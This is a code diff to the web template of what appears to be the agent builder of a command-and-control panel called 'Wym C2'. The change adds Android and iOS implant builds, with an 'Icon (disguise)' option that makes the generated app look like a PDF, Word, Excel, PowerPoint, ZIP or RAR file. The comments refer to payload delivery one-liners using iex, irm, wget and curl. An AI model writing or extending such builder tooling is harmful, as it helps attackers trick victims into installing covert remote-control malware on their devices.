@@ -1,4 +1,4 @@
-﻿{% extends "base.html" %}
+{% extends "base.html" %}
 {% block title %}Agent Builder - Wym C2{% endblock %}
 {% block content %}
 <link rel="stylesheet" href="/static/codemirror/codemirror.min.css">
@@ -131,6 +131,10 @@
         <option value="cpp" {% if gen_language|default('')=='cpp' %}selected{% endif %}>C++</option>
         <option value="java" {% if gen_language|default('')=='java' %}selected{% endif %}>Java</option>
       </optgroup>
+      <optgroup label="Mobile (build on server)">
+        <option value="android" {% if gen_language|default('')=='android' %}selected{% endif %}>Android (.apk)</option>
+        <option value="ios" {% if gen_language|default('')=='ios' %}selected{% endif %}>iOS (.ipa)</option>
+      </optgroup>
     </select>
   </div>
   <div>
@@ -191,6 +195,25 @@
       class="mt-1 w-full bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none">
     <input type="hidden" name="ext" id="gen-ext" value="{{ gen_ext|default('') }}">
   </div>
+  <div id="mobile-wrap" class="hidden items-center gap-4">
+    <div class="w-[230px]">
+      <label class="block text-[10px] text-muted uppercase tracking-wider mb-1">Artifact Name</label>
+      <input type="text" name="app_name" id="gen-app-name" value="{{ gen_app_name|default('') }}" placeholder="WymC2" autocomplete="off"
+        class="w-full bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 placeholder-gray-600 focus:border-accent outline-none">
+    </div>
+    <div class="w-[170px]">
+      <label class="block text-[10px] text-muted uppercase tracking-wider mb-1">Icon (disguise)</label>
+      <select name="mobile_icon" id="gen-mobile-icon" class="w-full bg-dark-800 border border-dark-400 rounded-lg px-3 py-2 text-sm font-mono text-gray-200 focus:border-accent outline-none">
+        <option value="none" {% if gen_mobile_icon|default('none')=='none' %}selected{% endif %}>WYM</option>
+        <option value="pdf" {% if gen_mobile_icon|default('')=='pdf' %}selected{% endif %}>PDF</option>
+        <option value="docx" {% if gen_mobile_icon|default('')=='docx' %}selected{% endif %}>DOCX</option>
+        <option value="xlsx" {% if gen_mobile_icon|default('')=='xlsx' %}selected{% endif %}>XLSX</option>
+        <option value="pptx" {% if gen_mobile_icon|default('')=='pptx' %}selected{% endif %}>PPTX</option>
+        <option value="zip" {% if gen_mobile_icon|default('')=='zip' %}selected{% endif %}>ZIP</option>
+        <option value="rar" {% if gen_mobile_icon|default('')=='rar' %}selected{% endif %}>RAR</option>
+      </select>
+    </div>
+  </div>
 </div>
 
 <div class="flex flex-wrap items-center gap-3">
@@ -207,33 +230,26 @@
 <div class="mt-4 bg-red-500/10 border border-red-500/40 rounded-xl px-4 py-3 text-xs font-mono text-red-400 whitespace-pre-wrap break-all">build failed for {{ gen_target | default('win_x64') }}: {{ gen_build_error | e }}</div>
 {% endif %}
 
-<h2 class="text-sm font-bold text-accent uppercase tracking-wider mt-10 mb-1">Build Log</h2>
-<div class="flex items-center justify-between mb-3">
-  <p class="text-xs text-muted">persisted in <code class="text-green-400/80">builds/logs</code> — track every build error &amp; fix.</p>
-  <div class="flex items-center gap-2">
-    <button type="button" id="build-log-clear" class="px-3 py-1 text-[10px] font-mono border border-danger/40 text-danger rounded hover:bg-danger/10 hover:border-danger transition cursor-pointer">clear</button>
-    <button type="button" id="build-log-refresh" class="px-3 py-1 text-[10px] font-mono border border-dark-400 text-muted rounded hover:text-accent hover:border-accent/30 transition cursor-pointer">refresh</button>
+{% if generated %}
+{% if gen_mobile|default(false) %}
+{% set icon_meta = {'none': ('WYM','text-green-400'), 'pdf': ('PDF','text-red-400'), 'docx': ('W','text-blue-400'), 'xlsx': ('X','text-green-400'), 'pptx': ('P','text-orange-400'), 'zip': ('ZIP','text-yellow-400'), 'rar': ('RAR','text-gray-300')} %}
+{% set im = icon_meta.get(gen_mobile_icon|default('none'), icon_meta['none']) %}
+<div class="mt-6 bg-dark-600 border border-accent/30 rounded-xl overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2.5 border-b border-dark-400">
+    <span class="text-xs text-muted">{{ 'Android' if gen_language=='android' else 'iOS' }} agent artifact</span>
+  </div>
+  <div class="p-4 flex flex-wrap items-center gap-4">
+    <div class="flex items-center justify-center w-16 h-16 shrink-0 rounded-xl bg-dark-800 border border-dark-400">
+      <span class="text-lg font-mono font-bold {{ im[1] }}">{{ im[0] }}</span>
+    </div>
+    <div class="min-w-0 flex-1">
+      <a id="gen-output" href="{{ gen_mobile_url }}" download title="{{ gen_mobile_url }}" class="font-mono text-xs text-accent underline decoration-accent/30 hover:text-accent break-all select-all">{{ gen_app_name|default('') or 'wym_' + gen_language }}{{ '.apk' if gen_language=='android' else '.ipa' }}</a>
+      <div class="mt-2 text-[10px] font-mono text-muted uppercase tracking-wider">icon: {{ gen_mobile_icon|default('none') }} &middot; label: {{ gen_app_name|default('') or 'WymC2' }}</div>
+    </div>
+    <a href="{{ gen_mobile_url }}" download class="px-4 py-2 text-xs font-mono font-bold bg-accent/10 border border-accent/30 text-accent rounded-lg hover:bg-accent/20 transition cursor-pointer uppercase tracking-wider shrink-0">download {{ '.ipa' if gen_language=='ios' else '.apk' }}</a>
   </div>
 </div>
-<div class="bg-dark-600 border border-dark-400 rounded-xl overflow-hidden">
-  <table class="w-full text-left font-mono text-xs">
-    <thead class="text-[10px] uppercase tracking-wider text-muted border-b border-dark-400">
-      <tr>
-        <th class="px-3 py-2">time</th>
-        <th class="px-3 py-2">build</th>
-        <th class="px-3 py-2">status</th>
-        <th class="px-3 py-2">duration</th>
-        <th class="px-3 py-2">result</th>
-        <th class="px-3 py-2 text-right">actions</th>
-      </tr>
-    </thead>
-    <tbody id="build-history-body">
-      <tr><td colspan="6" class="px-3 py-4 text-muted" id="build-history-empty">loading…</td></tr>
-    </tbody>
-  </table>
-</div>
-
-{% if generated %}
+{% else %}
 <div class="mt-6 bg-dark-600 border border-accent/30 rounded-xl overflow-hidden">
   <div class="flex items-center justify-between px-4 py-2.5 border-b border-dark-400">
     <span class="text-xs text-muted">one-liner command</span>
@@ -330,6 +346,33 @@
   });
 </script>
 {% endif %}
+{% endif %}
+
+<h2 class="text-sm font-bold text-accent uppercase tracking-wider mt-10 mb-1">Build Log</h2>
+<div class="flex items-center justify-between mb-3">
+  <p class="text-xs text-muted">persisted in <code class="text-green-400/80">builds/logs</code> — track every build error &amp; fix.</p>
+  <div class="flex items-center gap-2">
+    <button type="button" id="build-log-clear" class="px-3 py-1 text-[10px] font-mono border border-danger/40 text-danger rounded hover:bg-danger/10 hover:border-danger transition cursor-pointer">clear</button>
+    <button type="button" id="build-log-refresh" class="px-3 py-1 text-[10px] font-mono border border-dark-400 text-muted rounded hover:text-accent hover:border-accent/30 transition cursor-pointer">refresh</button>
+  </div>
+</div>
+<div class="bg-dark-600 border border-dark-400 rounded-xl overflow-hidden">
+  <table class="w-full text-left font-mono text-xs">
+    <thead class="text-[10px] uppercase tracking-wider text-muted border-b border-dark-400">
+      <tr>
+        <th class="px-3 py-2">time</th>
+        <th class="px-3 py-2">build</th>
+        <th class="px-3 py-2">status</th>
+        <th class="px-3 py-2">duration</th>
+        <th class="px-3 py-2">result</th>
+        <th class="px-3 py-2 text-right">actions</th>
+      </tr>
+    </thead>
+    <tbody id="build-history-body">
+      <tr><td colspan="6" class="px-3 py-4 text-muted" id="build-history-empty">loading…</td></tr>
+    </tbody>
+  </table>
+</div>
 
 <div id="build-modal" class="fixed inset-0 z-[60] flex items-center justify-center p-4" style="display:none">
   <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" id="build-modal-bd"></div>
@@ -347,11 +390,6 @@
     <div id="build-terminal" class="flex-1 bg-black overflow-hidden min-h-0"></div>
     <div class="flex items-center justify-between gap-4 px-4 py-1.5 border-t border-dark-400 bg-dark-700 text-[10px] font-mono text-muted flex-shrink-0">
       <span id="build-modal-elapsed">0.0s</span>
-      <span id="build-modal-msg" class="truncate min-w-0"></span>
-      <span class="flex items-center gap-2 flex-shrink-0">
-        <button type="button" id="build-modal-copy" disabled class="px-2 py-0.5 border border-dark-400 text-muted rounded hover:text-accent hover:border-accent/30 transition cursor-pointer disabled:opacity-40 disabled:cursor-not-allowed">copy log</button>
-        <span id="build-modal-result"></span>
-      </span>
     </div>
   </div>
 </div>
@@ -488,6 +526,8 @@
   const targetWrap = document.getElementById('target-wrap');
   const targetSel = document.getElementById('gen-target');
   const shellSel = document.getElementById('gen-shell-os');
+  const mobileWrap = document.getElementById('mobile-wrap');
+  const mobileLangs = ['android', 'ios'];
 
   function shellIsWin(){
     return (shellSel.value || '').startsWith('win-');
@@ -499,6 +539,7 @@
   // (win-iex vs win-irm, unix-wget vs unix-curl) is preserved so the user's
   // payload choice is never clobbered.
   function syncShellFromTarget(){
+    if (mobileLangs.includes(langSel.value)) return;
     if (!buildCb.checked) return;
     const isWinTarget = (targetSel.value || '').startsWith('win_');
     if (shellIsWin() === isWinTarget) return;
@@ -517,6 +558,7 @@
       : allTargets;
   }
   function syncTargetFromShell(){
+    if (mobileLangs.includes(langSel.value)) return;
     if (!buildCb.checked) return;
     const valid = targetsForLang(langSel.value);
     const curFam = (targetSel.value || '').split('_')[0];
@@ -622,10 +664,14 @@
 
   function toggleBuildOptions(){
     const isCompiled = compiledLangs.includes(langSel.value);
-    buildWrap.classList.toggle('hidden', !isCompiled);
-    targetWrap.classList.toggle('hidden', !(isCompiled && buildCb.checked));
-    const showExt = isCompiled && buildCb.checked && langSel.value !== 'java';
+    const isMobile = mobileLangs.includes(langSel.value);
+    if (isMobile) buildCb.checked = true;
+    buildWrap.classList.toggle('hidden', !isCompiled || isMobile);
+    targetWrap.classList.toggle('hidden', !(isCompiled && !isMobile && buildCb.checked));
+    const showExt = isCompiled && !isMobile && buildCb.checked && langSel.value !== 'java';
     extWrap.classList.toggle('hidden', !showExt);
+    mobileWrap.classList.toggle('hidden', !isMobile);
+    if (isMobile) { mobileWrap.classList.add('flex'); mobileWrap.classList.remove('hidden'); }
     rebuildTargets(langSel.value);
     if(showExt) applyExtUI();
   }
@@ -671,13 +717,13 @@
   var targetSel = document.getElementById('gen-target');
   var buildCb = document.getElementById('gen-build-cb');
   var compiledLangs = ['go','csharp','rust','c','cpp','java'];
+  var mobileLangs = ['android','ios'];
   var term = null;
   var fitAddon = null;
   var pill = document.getElementById('build-min-pill');
   var pillText = document.getElementById('build-min-text');
   var pillDot = document.getElementById('build-min-dot');
   var pillRestore = document.getElementById('build-min-restore');
-  var copyBtn = document.getElementById('build-modal-copy');
   var jobId = '';
   var collected = [];
 
@@ -707,7 +753,8 @@
   }
 
   form.addEventListener('submit', async function(e){
-    var wantsBuild = buildCb.checked && compiledLangs.indexOf(langSel.value) >= 0;
+    var wantsBuild = mobileLangs.indexOf(langSel.value) >= 0
+      || (buildCb.checked && compiledLangs.indexOf(langSel.value) >= 0);
     if(!wantsBuild) return;
     e.preventDefault();
     e.stopPropagation();
@@ -742,8 +789,6 @@
     var extVal = (document.getElementById('gen-ext') || {}).value || '';
     document.getElementById('build-modal-title').textContent =
       langSel.value + ' \u00b7 ' + targetSel.value + (extVal ? ' \u00b7 ' + extVal : '');
-    document.getElementById('build-modal-result').textContent = '';
-    document.getElementById('build-modal-msg').textContent = '';
     document.getElementById('build-modal-elapsed').textContent = '0.0s';
     setStatus('starting');
     showPill('building ' + langSel.value + ' \u2192 ' + targetSel.value + ' \u00b7 0.0s');
@@ -754,13 +799,17 @@
     var lastWritten = '';
     collected.length = 0;
     jobId = '';
-    if(copyBtn) copyBtn.disabled = true;
 
     try {
+      var mIconSel = document.getElementById('gen-mobile-icon');
+      var mNameEl = document.getElementById('gen-app-name');
+      var mIcon = (mIconSel && mIconSel.value) || 'none';
+      var mName = (mNameEl && mNameEl.value || '').trim();
       var resp = await fetch('/api/build/start', {
         method: 'POST',
         headers: {'Content-Type':'application/json','X-CSRF-Token': CSRF_TOKEN},
-        body: JSON.stringify({language: langSel.value, target: targetSel.value})
+        body: JSON.stringify({language: langSel.value, target: targetSel.value,
+                              icon: mIcon, name: mName})
       });
       if(!resp.ok){
         var derr = await resp.json().catch(function(){ return {}; });
@@ -770,7 +819,6 @@
       }
       var data = await resp.json();
       jobId = data.job_id;
-      if(copyBtn) copyBtn.disabled = false;
       writeLine('\x1b[1m' + data.language + ' \u2192 ' + data.target + '\x1b[0m');
       writeLine('');
       setStatus('building\u2026', 'text-accent');
@@ -806,19 +854,13 @@
       if(done){
         var el2 = document.getElementById('build-modal-elapsed');
         if(el2) el2.textContent = ((Date.now() - started) / 1000).toFixed(1) + 's';
-        var msgEl = document.getElementById('build-modal-msg');
-        var resEl = document.getElementById('build-modal-result');
         if(success){
           setStatus('done \u2713', 'text-green-400');
-          if(msgEl) msgEl.textContent = message;
-          if(resEl){ resEl.textContent = '\u2713 build ok'; resEl.className = 'font-mono text-[10px] text-green-400'; }
           showPill('ok \u2713 ' + message, 'bg-green-400');
           await delay(900);
           form.submit();
         } else {
           setStatus('failed', 'text-red-400');
-          if(msgEl) msgEl.textContent = message;
-          if(resEl){ resEl.textContent = 'failed'; resEl.className = 'font-mono text-[10px] text-red-400'; }
           showPill('build failed \u2192 ' + langSel.value + ' ' + targetSel.value, 'bg-red-400');
           // Persisted log is written right after the terminal reports done, so
           // refresh the Build Log table (no manual refresh needed).
@@ -839,23 +881,6 @@
     buildModal.style.display = 'none';
   });
   if(pillRestore) pillRestore.addEventListener('click', openBuildModal);
-  if(copyBtn){
-    var copyLabel = function(txt){
-      copyBtn.textContent = txt;
-      setTimeout(function(){ copyBtn.textContent = 'copy log'; }, 1500);
-    };
-    copyBtn.addEventListener('click', function(){
-      var doCopy = function(txt){
-        navigator.clipboard.writeText(txt).then(function(){ copyLabel('copied \u2713'); }).catch(function(){});
-      };
-      if(!jobId){ doCopy(collected.join('\n')); return; }
-      // prefer the persisted logfile (matches the Build Log panel)
-      fetch('/api/build/logfile/' + encodeURIComponent(jobId))
-        .then(function(r){ return r.ok ? r.text() : Promise.reject(new Error('logfile')); })
-        .then(function(t){ doCopy(t); })
-        .catch(function(){ doCopy(collected.join('\n')); });
-    });
-  }
   window.addEventListener('resize', fitTerm);
 })();
 </script>
